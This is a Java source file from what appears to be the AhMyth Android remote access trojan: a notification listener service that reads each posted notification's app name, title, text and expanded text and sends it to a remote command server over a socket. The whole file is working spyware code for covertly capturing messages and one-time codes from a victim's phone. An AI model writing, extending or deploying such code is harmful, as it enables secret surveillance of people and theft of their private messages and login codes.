package ahmyth.mine.king.ahmyth;

import android.app.Notification;
import android.content.Intent;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class NotificationListener extends NotificationListenerService {

    private static final String TAG = "NotificationListener";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);

        try {
            String packageName = sbn.getPackageName();
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;

            String title = extras.getString(Notification.EXTRA_TITLE);
            String text = extras.getCharSequence(Notification.EXTRA_TEXT) != null ?
                    extras.getCharSequence(Notification.EXTRA_TEXT).toString() : "";
            String bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT) != null ?
                    extras.getCharSequence(Notification.EXTRA_BIG_TEXT).toString() : "";

            long postTime = sbn.getPostTime();

            JSONObject notifData = new JSONObject();
            notifData.put("packageName", packageName);
            notifData.put("title", title != null ? title : "");
            notifData.put("text", text);
            notifData.put("bigText", bigText);
            notifData.put("postTime", postTime);
            notifData.put("id", sbn.getId());
            notifData.put("key", sbn.getKey());

            // Kirim ke server
            sendNotificationToServer(notifData);

            Log.d(TAG, "Notification: " + packageName + " - " + title + " - " + text);

        } catch (Exception e) {
            Log.e(TAG, "Error reading notification", e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
        Log.d(TAG, "Notification removed: " + sbn.getPackageName());
    }

    private void sendNotificationToServer(JSONObject notifData) {
        try {
            if (IOSocket.getInstance().getIoSocket() != null &&
                    IOSocket.getInstance().getIoSocket().connected()) {
                IOSocket.getInstance().getIoSocket().emit("x0000nf", notifData);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending notification", e);
        }
    }
}